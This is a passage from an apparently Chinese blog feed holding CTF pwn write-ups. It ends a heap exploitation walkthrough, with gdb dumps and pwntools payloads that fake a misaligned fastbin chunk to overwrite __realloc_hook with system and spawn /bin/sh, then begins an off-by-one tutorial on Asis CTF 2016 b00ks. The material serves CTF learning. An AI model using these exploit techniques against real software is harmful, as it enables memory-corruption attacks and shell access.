<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x55be33916070-0x70</span><br><span class="line">0x55be33916000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x55be33916010:	0x0000000000000000	0x0000000000000080</span><br><span class="line">0x55be33916020:	0x000055be339160b0	0x0000000000000000</span><br><span class="line">0x55be33916030:	0x0000000000000000	0x000055be33916140</span><br><span class="line">0x55be33916040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55be33916050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x55be33916060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x55be33916070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x55be33916080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55be33916090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160a0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55be339160b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916130:	0x0000000000000000	0x0000000000000271</span><br><span class="line">0x55be33916140:	0x00007fa9f416c7b8	0x00007fa9f416c7b8 <span class="comment">#覆盖了原来的0x18</span></span><br><span class="line">0x55be33916150:	0x000055be33916050	0x0000000000000000</span><br><span class="line">0x55be33916160:	0x0000000000000000	0x000055be33916250</span><br><span class="line">0x55be33916170:	0x0000000000000001	0x0000000000000041</span><br><span class="line">0x55be33916180:	0x000055be339163e0	0x0000000000000088</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190829213254-81676342-ca61-1.png" alt="leak" title="leak"></p>
<h4 id="保护现场"><a href="#保护现场" class="headerlink" title="保护现场"></a>保护现场</h4><p>这步是比较难的，因为堆块申请的位置不确定，需要一步步调试确定，我建议每部署一部分，调试一次状况，然后在进行现场的保护</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(heap_base+<span class="number">0x70</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x3e0</span>)</span><br><span class="line">payload += p64(<span class="number">0x88</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0xb0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(realloc_hook_addr<span class="number">-0x8</span><span class="number">-0x3</span><span class="number">-0x8</span>)</span><br><span class="line">PUT(<span class="string">"6"</span>*<span class="number">0x8</span>, <span class="number">0xa8</span>, payload)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x290</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">PUT(<span class="string">"c"</span>*<span class="number">0x8</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)+p64(heap_base+<span class="number">0x230</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">PUT(<span class="string">"d"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure>
<p>具体我怎么调试示范下，先在1处gdb.attach(p)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/100gx 0x559717162000</span><br><span class="line">0x559717162000:	0x0000000000000000	0x0000000000000041 <span class="comment">#结构体chunk</span></span><br><span class="line">0x559717162010:	0x00005597171621c0	0x00000000000000a8</span><br><span class="line">0x559717162020:	0x0000559717162140	0x0000000000000000</span><br><span class="line">0x559717162030:	0x0000000000000000	0x0000559717162140</span><br><span class="line">0x559717162040:	0x0000000000000001	0x0000000000000021</span><br><span class="line">0x559717162050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x559717162060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x559717162070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x559717162080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559717162090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620a0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5597171620b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162130:	0x0000000000000000	0x00000000000000b1 <span class="comment">#payload chunk </span></span><br><span class="line">0x559717162140:	0x0000559717162070	0x0000000000000008</span><br><span class="line">0x559717162150:	0x0000559717162050	0x0000559717162010</span><br><span class="line">0x559717162160:	0x0000000000000000	0x0000559717162250</span><br><span class="line">0x559717162170:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x559717162180:	0x00005597171623e0	0x0000000000000088</span><br><span class="line">0x559717162190:	0x00005597171620b0	0x0000000000000000</span><br><span class="line">0x5597171621a0:	0x0000000000000000	0x0000559717162250</span><br><span class="line">0x5597171621b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171621c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171621d0:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5597171621e0:	0x00007fc9194dc71d	0x00000000000001c1 <span class="comment">#payload end</span></span><br><span class="line">0x5597171621f0:	0x00007fc9194dc7b8	0x00007fc9194dc7b8</span><br><span class="line">0x559717162200:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162210:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162220:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162230:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162240:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x559717162250:	0x0000559717162290	0x0000000000000020</span><br><span class="line">0x559717162260:	0x00005597171623b0	0x0000559717162140</span><br><span class="line">0x559717162270:	0x0000559717162180	0x0000000000000000</span><br><span class="line">0x559717162280:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559717162290:	0x3434343434343434	0x0000000000000000</span><br><span class="line">0x5597171622a0:	0x0000000000000200	0x0000000000000100</span><br><span class="line">0x5597171622b0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622c0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622d0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622e0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622f0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162300:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162310:	0x4343434343434343	0x4343434343434343</span><br></pre></td></tr></table></figure>
<p>既然知道他会覆盖那部分，我就提前查看这部分内容，进行覆盖就行了，然后将gdb.attach放到合并堆块那会，查看具体内容，也就是在这</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p)</span><br><span class="line">PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">DUMP()</span><br></pre></td></tr></table></figure>
<p>查看具体内容，然后进行覆盖</p>
<ol>
<li><p>我上面所说的这是土方法，我测试出来的。</p>
</li>
<li><p>其实这些都可以预估的，前面DEL(1) DEL(3),所以会空闲两个结构体，这是fastbin部分的空闲堆块，所以结构体会在原来的chunk上建立，至于申请的0xa8不属于fastbin里，所以他会从大堆块里取，取出能存放0xa8大小的chunk，第二次put的话先申请一个结构体0x40大小的结构体存放红黑树结构，然后在申请0x78大小的chunk，都是从大堆块里取，因为此时fastbin里没有空闲堆块了，第一块用于PUT(“a”, 0x88, p8(0)<em>0x88),第二块用于PUT(“6”</em>0x8, 0xa8, payload)</p>
</li>
<li><p>PUT(“d”*0x8, 0x60, payload)这里先申请一个堆块，同时保护现场，因为原来是fastbin中的一个chunk指向了realloc_hook，现在申请过后，在申请一个堆块便是realloc_hook的地址了</p>
</li>
</ol>
<p>注意：还记得开头申请两个3吗，申请第二个3的时候会先删除前一个chunk，那个就是fastbin里0x70大小的chunk，所以我们覆盖的就是这个chunk的fd</p>
<h4 id="覆写realloc-hook"><a href="#覆写realloc-hook" class="headerlink" title="覆写realloc_hook"></a>覆写realloc_hook</h4><p>还记得我前面realloc_hook地址怎么写payload的吗<br>看<br>realloc_hook_addr-0x8-0x3-0x8<br>为什么要这么写呢？<br>先看看realloc_hook附近</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10</span><br><span class="line">0x7f14d2670720 &lt;__memalign_hook&gt;:	0x00007f14d2335c90	0x0000000000000000</span><br><span class="line">0x7f14d2670730 &lt;__realloc_hook&gt;:	0x00007f14d2335c30	0x0000000000000000</span><br><span class="line">0x7f14d2670740 &lt;__malloc_hook&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>你记得malloc_chunk是怎么样的吗？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如果我们要申请个chunk的话，应当如何，不伪造chunk可不可以，我尝试过，失败了，<br>我报了这个错<br><strong>malloc(): memory corruption (fast)</strong><br>经师傅提点，去查看malloc源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">   This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">   can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())) &#123;</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的下标</span></span><br><span class="line">    idx             = fastbin_index(nb);</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的头指针</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr    pp = *fb;</span><br><span class="line">    <span class="comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,</span><br><span class="line">                                                        victim)) != victim);</span><br><span class="line">    <span class="comment">// 存在可以利用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">        <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">        <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">        errout:</span><br><span class="line">            malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 细致的检查。。只有在 DEBUG 的时候有用</span></span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="comment">// 将获取的到chunk转换为mem模式</span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他会检测大小是否正确，所以不伪造chunk的size部分过不了关的<br>在回到这里</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10</span><br><span class="line">0x7f14d2670720 &lt;__memalign_hook&gt;:	0x00007f14d2335c90	0x0000000000000000</span><br><span class="line">0x7f14d2670730 &lt;__realloc_hook&gt;:	0x00007f14d2335c30	0x0000000000000000</span><br><span class="line">0x7f14d2670740 &lt;__malloc_hook&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>这样是个chunk的话，pre_size是0x00007f14d2335c90，size是0，这样肯定没法搞，所以我们要利用一点错位，让size成功变成fastbin里的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10-0x3</span><br><span class="line">0x7f14d267071d:	0x14d2335c90000000	0x000000000000007f</span><br><span class="line">0x7f14d267072d:	0x14d2335c30000000	0x000000000000007f</span><br><span class="line">0x7f14d267073d:	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>这样不就成了，size为0x7f，然后我们现在大小对了，位置错位了，所以最后我们要补个’a’*0x3来填充我们的错位部分，然后在realloc部分填上我们的system地址，最后在调用一次getshell</p>
<p>这里的错位需要自己调试，不一定是跟我一样的错位，在fastbin attack部分也将会学习到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = libc_base+system_off</span><br><span class="line">print(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x3</span></span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p8(<span class="number">0</span>)*(<span class="number">0x4d</span>+<span class="number">0x8</span>)</span><br><span class="line">PUT(<span class="string">"e"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">payload = <span class="string">"/bin/sh"</span></span><br><span class="line">payload += p8(<span class="number">0</span>)*<span class="number">0x12</span> </span><br><span class="line">GET(payload)</span><br></pre></td></tr></table></figure>

<p>到了结尾了，这里有个点说明下，我们malloc(0x7f)跟伪造chunk的size是完全不一样的，我们malloc过后还要经过计算才得到size，你看普通malloc(0x7f)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x557c81b53130:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x557c81b53140:	0x0000557c81b53070	0x000000000000007f</span><br><span class="line">0x557c81b53150:	0x0000557c81b53180	0x0000557c81b53010</span><br><span class="line">0x557c81b53160:	0x0000557c81b53210	0x0000000000000000</span><br><span class="line">0x557c81b53170:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x557c81b53180:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b53190:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531a0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531b0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531c0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531d0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531e0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531f0:	0x4242424242424242	0x0042424242424242</span><br></pre></td></tr></table></figure>
<p>他获得的是0x91大小的chunk，具体size计算可以自己看源码，我只是点出这个点而已</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>这道题知识点较多，利用较复杂，利用堆块重叠泄露，在用fastbin attack</li>
<li>错位伪造chunk知识点，补上了，第一次遇到</li>
<li>这道题需要对堆的分配机制较为熟练才比较好做，像我调试了很久，最终才的出来的结论</li>
<li>遇到错误要学会去查看源码，好几个师傅都叫我看源码，最后才懂的</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bbs.pediy.com/thread-246966.htm" target="_blank" rel="noopener">看雪的师傅的文章</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/" target="_blank" rel="noopener">ctf-wiki原理介绍</a></p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程1</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程1"><a href="#pwn堆入门系列教程1" class="headerlink" title="pwn堆入门系列教程1"></a>pwn堆入门系列教程1</h1><p>因为自己学堆的时候，找不到一个系统的教程，我将会按照ctf-wiki的目录一步步学下去，尽量做到每天有更新，方便跟我一样刚入门堆的人学习，第一篇教程研究了4天吧，途中没人指导。。很尴尬，自己一个很容易的点研究了很久才懂，把踩过的坑也总结下，方便后人不再踩坑</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://xz.aliyun.com/t/5749" target="_blank" rel="noopener">具体搭建方法点我</a></p><a id="more"></a>

<h2 id="off-by-one原理（引用ctf-wiki"><a href="#off-by-one原理（引用ctf-wiki" class="headerlink" title="off by one原理（引用ctf-wiki)"></a>off by one原理（引用ctf-wiki)</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
<p>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。<br>字符串操作不合适<br>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
<h2 id="off-by-one-利用思路（引用ctf-wiki"><a href="#off-by-one-利用思路（引用ctf-wiki" class="headerlink" title="off-by-one 利用思路（引用ctf-wiki)"></a>off-by-one 利用思路（引用ctf-wiki)</h2><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法<br>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</p>
<h2 id="off-by-one-自己理解"><a href="#off-by-one-自己理解" class="headerlink" title="off by one 自己理解"></a>off by one 自己理解</h2><p>其实就是程序员不小心，我们自己刚写代码的时候也是那样，经常会搞错，比如如下c代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    str[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码相信类似的，我们都写过，我们数组最高是<br>数组总长为5，数组下标从0开始，最大为4，而我们错误地使用了str[5],造成越界写了一个字节，这就是off-by-one，可这个开始我也没懂这个的强大，直到做了一道题目</p>
<h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p>ctf-wiki上用了两种方法解这道题，我也就照着他的exp，一步步调试，没注释就慢慢理解，搞定了，他有纯利用off-by-one的，也有同时利用unlink跟off-by-one的，下面对这两种方法进行解释</p>
<p>先指出ida解析错误部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">    *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">    *(off_202010 + v2) = v3;</span><br><span class="line">    *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">    *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">    *v3 = ++unk_202024;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个v3加6是错误的偏移，应该是v3+3，具体看汇编代码就可以了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text:<span class="number">0000000000001122</span> ; <span class="number">48</span>:                   *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">.text:<span class="number">0000000000001122</span></span><br><span class="line">.text:<span class="number">0000000000001122</span> loc_1122:                               ; CODE XREF: Create+<span class="number">1B</span>8↑j</span><br><span class="line">.text:<span class="number">0000000000001122</span>                 mov     eax, [rbp+var_20]</span><br><span class="line">.text:<span class="number">0000000000001125</span>                 mov     edx, eax</span><br><span class="line">.text:<span class="number">0000000000001127</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000112B</span>                 mov     [rax+<span class="number">18</span>h], edx</span><br><span class="line">.text:<span class="number">000000000000112</span>E ; <span class="number">49</span>:                   *(off_202010 + v2) = v3;</span><br><span class="line">.text:<span class="number">000000000000112</span>E                 lea     rax, off_202010</span><br><span class="line">.text:<span class="number">0000000000001135</span>                 mov     rax, [rax]</span><br><span class="line">.text:<span class="number">0000000000001138</span>                 mov     edx, [rbp+var_1C]</span><br><span class="line">.text:<span class="number">000000000000113B</span>                 movsxd  rdx, edx</span><br><span class="line">.text:<span class="number">000000000000113</span>E                 shl     rdx, <span class="number">3</span></span><br><span class="line">.text:<span class="number">0000000000001142</span>                 add     rdx, rax</span><br><span class="line">.text:<span class="number">0000000000001145</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001149</span>                 mov     [rdx], rax</span><br><span class="line">.text:<span class="number">000000000000114</span>C ; <span class="number">50</span>:                   *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">.text:<span class="number">000000000000114</span>C                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001150</span>                 mov     rdx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000001154</span>                 mov     [rax+<span class="number">10</span>h], rdx</span><br><span class="line">.text:<span class="number">0000000000001158</span> ; <span class="number">51</span>:                   *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">.text:<span class="number">0000000000001158</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000115</span>C                 mov     rdx, [rbp+ptr]</span><br><span class="line">.text:<span class="number">0000000000001160</span>                 mov     [rax+<span class="number">8</span>], rdx</span><br><span class="line">.text:<span class="number">0000000000001164</span> ; <span class="number">52</span>:                   *v3 = ++unk_202024;</span><br><span class="line">.text:<span class="number">0000000000001164</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">000000000000116B</span>                 mov     eax, [rax]</span><br><span class="line">.text:<span class="number">000000000000116</span>D                 lea     edx, [rax+<span class="number">1</span>]</span><br><span class="line">.text:<span class="number">0000000000001170</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001177</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001179</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001180</span>                 mov     edx, [rax]</span><br><span class="line">.text:<span class="number">0000000000001182</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001186</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001188</span>                 mov     eax, <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>看每段的mov语句，</p>
<ul>
<li>第一段是mov [rax+18h],edx对应v3+6?</li>
<li>第二段不看，加了变量</li>
<li>第三段是mov [rax+10h],rdx对应v3+2？</li>
</ul>
<h4 id="off-by-one-攻击过程"><a href="#off-by-one-攻击过程" class="headerlink" title="off-by-one 攻击过程"></a>off-by-one 攻击过程</h4><p>出现这个漏洞的函数在这</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>; <span class="comment">//危险部分</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
